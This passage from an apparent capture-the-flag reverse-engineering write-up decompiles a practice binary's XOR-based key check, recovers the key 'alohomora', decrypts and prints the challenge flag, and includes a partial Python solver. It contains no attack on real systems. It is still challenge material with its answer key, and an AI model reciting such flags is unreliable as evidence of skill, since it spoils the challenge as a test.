</pre></table></code></div></div><h4 id="step-4-analyze-validation-logic-in-disassembler"><span class="mr-2">Step 4: Analyze Validation Logic in Disassembler</span><a href="#step-4-analyze-validation-logic-in-disassembler" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Opened the binary in Ghidra and decompiled the <code class="language-plaintext highlighter-rouge">main</code> function. Identified the key derivation and validation:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">key_enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x55</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">18</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">flag_enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">9</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h4 id="step-5-compute-the-real-key"><span class="mr-2">Step 5: Compute the Real Key</span><a href="#step-5-compute-the-real-key" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">key_enc</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">34393a3d3a383a2734</span><span class="sh">'</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="mh">0x55</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">key_enc</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">key</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>  <span class="c1"># Output: alohomora
</span></pre></table></code></div></div><p>The real key is: <code class="language-plaintext highlighter-rouge">alohomora</code></p><h4 id="step-6-decrypt-the-flag"><span class="mr-2">Step 6: Decrypt the Flag</span><a href="#step-6-decrypt-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">flag_enc</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">125f0c1a5c193043123e1901595f0e041705</span><span class="sh">'</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">alohomora</span><span class="sh">'</span>
<span class="n">flag</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">9</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">)))</span>
<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>  <span class="c1"># Output: s3cr3t_1s_un10cked
</span></pre></table></code></div></div><h4 id="step-7-verify-and-retrieve-flag"><span class="mr-2">Step 7: Verify and Retrieve Flag</span><a href="#step-7-verify-and-retrieve-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>./challenge.dat
Speak the binding spell: alohomora
Flag: cys<span class="o">{</span>s3cr3t_1s_un10cked<span class="o">}</span>
</pre></table></code></div></div><p>Successfully retrieved the real flag by entering the correct key.</p><h3 id="python-solver-script"><span class="mr-2">Python solver script</span><a href="#python-solver-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cys{s3cr3t_1s_un10cked}
</pre></table></code></div></div><h3 id="solver-python-code"><span class="mr-2">solver python code</span><a href="#solver-python-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>the code could change for new binary file as hex dump locations might change</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">extract_data_from_binary</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="sh">'</span><span class="s">l</span><span class="sh">'</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Extract data from the binary file</span><span class="sh">"""</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
        
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] File size: </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes (0x</span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
        
        <span class="c1"># The addresses are 0x404060 and 0x404070
</span>        <span class="c1"># We need to find the file offset for these virtual addresses
</span>        
        <span class="c1"># Common data section offsets to try
</span>        <span class="n">possible_offsets</span> <span class="o">=</span> <span class="p">[</span>
            <span class="mh">0x3060</span><span class="p">,</span>  <span class="c1"># 0x404060 - 0x401000 (common base)
</span>            <span class="mh">0x2060</span><span class="p">,</span>  <span class="c1"># Alternative
</span>            <span class="mh">0x4060</span><span class="p">,</span>  <span class="c1"># Alternative (if base is 0x400000)
</span>            <span class="mh">0x3040</span><span class="p">,</span>  <span class="c1"># Another common offset
</span>        <span class="p">]</span>
        
        <span class="k">for</span> <span class="n">base_offset</span> <span class="ow">in</span> <span class="n">possible_offsets</span><span class="p">:</span>
            <span class="n">offset_60</span> <span class="o">=</span> <span class="n">base_offset</span>
            <span class="n">offset_70</span> <span class="o">=</span> <span class="n">base_offset</span> <span class="o">+</span> <span class="mh">0x10</span>
            
            <span class="k">if</span> <span class="n">offset_60</span> <span class="o">+</span> <span class="mi">9</span> <span class="o">&lt;=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="ow">and</span> <span class="n">offset_70</span> <span class="o">+</span> <span class="mi">18</span> <span class="o">&lt;=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
                <span class="n">data_404060</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">offset_60</span><span class="p">:</span><span class="n">offset_60</span><span class="o">+</span><span class="mi">9</span><span class="p">]</span>
                <span class="n">data_404070</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">offset_70</span><span class="p">:</span><span class="n">offset_70</span><span class="o">+</span><span class="mi">18</span><span class="p">]</span>
                
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[*] Trying base offset: 0x</span><span class="si">{</span><span class="n">base_offset</span><span class="si">:</span><span class="mi">04</span><span class="n">x</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    data_404060 (offset 0x</span><span class="si">{</span><span class="n">offset_60</span><span class="si">:</span><span class="mi">04</span><span class="n">x</span><span class="si">}</span><span class="s">): </span><span class="si">{</span><span class="n">data_404060</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    data_404070 (offset 0x</span><span class="si">{</span><span class="n">offset_70</span><span class="si">:</span><span class="mi">04</span><span class="n">x</span><span class="si">}</span><span class="s">): </span><span class="si">{</span><span class="n">data_404070</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                
                <span class="c1"># Try to decode and check if it makes sense
</span>                <span class="n">result</span> <span class="o">=</span> <span class="nf">solve_with_data</span><span class="p">(</span><span class="n">data_404060</span><span class="p">,</span> <span class="n">data_404070</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">result</span> <span class="ow">and</span> <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">valid</span><span class="sh">'</span><span class="p">]:</span>
                    <span class="k">return</span> <span class="n">result</span>
        
        <span class="c1"># If nothing worked, try scanning the file
</span>        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[*] Trying to scan entire file for valid patterns...</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">scan_for_data</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        
    <span class="k">except</span> <span class="nb">FileNotFoundError</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error: File </span><span class="sh">'</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="sh">'</span><span class="s"> not found</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">None</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="kn">import</span> <span class="n">traceback</span>
        <span class="n">traceback</span><span class="p">.</span><span class="nf">print_exc</span><span class="p">()</span>
        <span class="k">return</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">scan_for_data</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Scan the file for potential encoded data</span><span class="sh">"""</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Scanning for 9-byte sequences that decode to printable ASCII...</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="n">candidates</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-</span> <span class="mi">9</span><span class="p">):</span>
        <span class="c1"># Try XORing with 0x55
</span>        <span class="n">spell</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">()</span>
        <span class="n">valid</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
            <span class="n">char</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x55</span>
            <span class="k">if</span> <span class="n">char</span> <span class="o">&lt;</span> <span class="mh">0x20</span> <span class="ow">or</span> <span class="n">char</span> <span class="o">&gt;</span> <span class="mh">0x7e</span><span class="p">:</span>  <span class="c1"># Not printable ASCII
</span>                <span class="n">valid</span> <span class="o">=</span> <span class="bp">False</span>
                <span class="k">break</span>
            <span class="n">spell</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="n">valid</span><span class="p">:</span>
            <span class="n">spell_str</span> <span class="o">=</span> <span class="n">spell</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Found at offset 0x</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="mi">04</span><span class="n">x</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">spell_str</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">candidates</span><span class="p">.</span><span class="nf">append</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">9</span><span class="p">]))</span>
    
    <span class="k">if</span> <span class="n">candidates</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[*] Found </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">candidates</span><span class="p">)</span><span class="si">}</span><span class="s"> candidate(s)</span><span class="sh">"</span><span class="p">)</span>
        <span class="c1"># Use the first candidate
</span>        <span class="n">offset</span><span class="p">,</span> <span class="n">data_404060</span> <span class="o">=</span> <span class="n">candidates</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="c1"># Look for data_404070 nearby (16 bytes after)
</span>        <span class="n">data_404070</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">16</span><span class="p">:</span><span class="n">offset</span><span class="o">+</span><span class="mi">16</span><span class="o">+</span><span class="mi">18</span><span class="p">]</span> <span class="k">if</span> <span class="n">offset</span><span class="o">+</span><span class="mi">16</span><span class="o">+</span><span class="mi">18</span> <span class="o">&lt;=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="k">else</span> <span class="bp">None</span>
        
        <span class="k">if</span> <span class="n">data_404070</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Using data at offset 0x</span><span class="si">{</span><span class="n">offset</span><span class="si">:</span><span class="mi">04</span><span class="n">x</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">solve_with_data</span><span class="p">(</span><span class="n">data_404060</span><span class="p">,</span> <span class="n">data_404070</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">solve_with_data</span><span class="p">(</span><span class="n">data_404060</span><span class="p">,</span> <span class="n">data_404070</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Solve the challenge with extracted data</span><span class="sh">"""</span>
    
    <span class="c1"># Step 1: Calculate the spell (key)
</span>    <span class="c1"># var_1d[i] = data_404060[i] ^ 0x55
</span>    <span class="n">spell</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
        <span class="n">spell</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">data_404060</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x55</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] Calculated Spell:</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Hex: </span><span class="si">{</span><span class="n">spell</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Try to decode as ASCII
</span>    <span class="k">try</span><span class="p">:</span>
        <span class="n">spell_str</span> <span class="o">=</span> <span class="n">spell</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    ASCII: </span><span class="si">{</span><span class="n">spell_str</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">is_printable</span> <span class="o">=</span> <span class="nf">all</span><span class="p">(</span><span class="mi">32</span> <span class="o">&lt;=</span> <span class="n">b</span> <span class="o">&lt;=</span> <span class="mi">126</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">spell</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">spell_str</span> <span class="o">=</span> <span class="n">spell</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="sh">'</span><span class="s">replace</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    ASCII (with errors): </span><span class="si">{</span><span class="n">spell_str</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">is_printable</span> <span class="o">=</span> <span class="bp">False</span>
    
    <span class="c1"># Step 2: Decode the flag (Mirror Key)
</span>    <span class="c1"># var_88[i] = var_1d[i % 9] ^ data_404070[i]
</span>    <span class="n">flag</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">18</span><span class="p">):</span>
        <span class="n">flag</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">spell</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">9</span><span class="p">]</span> <span class="o">^</span> <span class="n">data_404070</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] Decoded Mirror Key:</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Hex: </span><span class="si">{</span><span class="n">flag</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Try to decode as ASCII
</span>    <span class="k">try</span><span class="p">:</span>
        <span class="n">flag_str</span> <span class="o">=</span> <span class="n">flag</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    ASCII: </span><span class="si">{</span><span class="n">flag_str</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">flag_printable</span> <span class="o">=</span> <span class="nf">all</span><span class="p">(</span><span class="mi">32</span> <span class="o">&lt;=</span> <span class="n">b</span> <span class="o">&lt;=</span> <span class="mi">126</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">flag_str</span> <span class="o">=</span> <span class="n">flag</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="sh">'</span><span class="s">replace</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    ASCII (with errors): </span><span class="si">{</span><span class="n">flag_str</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">flag_printable</span> <span class="o">=</span> <span class="bp">False</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">SOLUTION:</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Ancient Spell to Enter: </span><span class="si">{</span><span class="n">spell_str</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Mirror Key (Flag): </span><span class="si">{</span><span class="n">flag_str</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">spell</span><span class="sh">'</span><span class="p">:</span> <span class="n">spell_str</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">flag</span><span class="sh">'</span><span class="p">:</span> <span class="n">flag_str</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">valid</span><span class="sh">'</span><span class="p">:</span> <span class="n">is_printable</span> <span class="ow">and</span> <span class="n">flag_printable</span>
    <span class="p">}</span>

<span class="k">def</span> <span class="nf">manual_solve</span><span class="p">():</span>
    <span class="sh">"""</span><span class="s">Manual solver - paste your hex data here</span><span class="sh">"""</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">MANUAL MODE</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter the hex data from the binary</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">To get the data manually, use:</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  readelf -x .data l</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  or</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  objdump -s -j .data l</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">()</span>
    
    <span class="n">data_404060_hex</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter data_404060 (9 bytes in hex, e.g., 1a2b3c...): </span><span class="sh">"</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
    <span class="n">data_404070_hex</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter data_404070 (18 bytes in hex, e.g., 4d5e6f...): </span><span class="sh">"</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
    
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Remove spaces and common separators
</span>        <span class="n">data_404060_hex</span> <span class="o">=</span> <span class="n">data_404060_hex</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">0x</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
        <span class="n">data_404070_hex</span> <span class="o">=</span> <span class="n">data_404070_hex</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">0x</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
        
        <span class="n">data_404060</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">data_404060_hex</span><span class="p">)</span>
        <span class="n">data_404070</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">data_404070_hex</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">data_404060</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">9</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error: data_404060 should be 9 bytes, got </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">data_404060</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span>
        
        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">data_404070</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">18</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error: data_404070 should be 18 bytes, got </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">data_404070</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span>
        
        <span class="nf">print</span><span class="p">()</span>
        <span class="nf">solve_with_data</span><span class="p">(</span><span class="n">data_404060</span><span class="p">,</span> <span class="n">data_404070</span><span class="p">)</span>
        
    <span class="k">except</span> <span class="nb">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
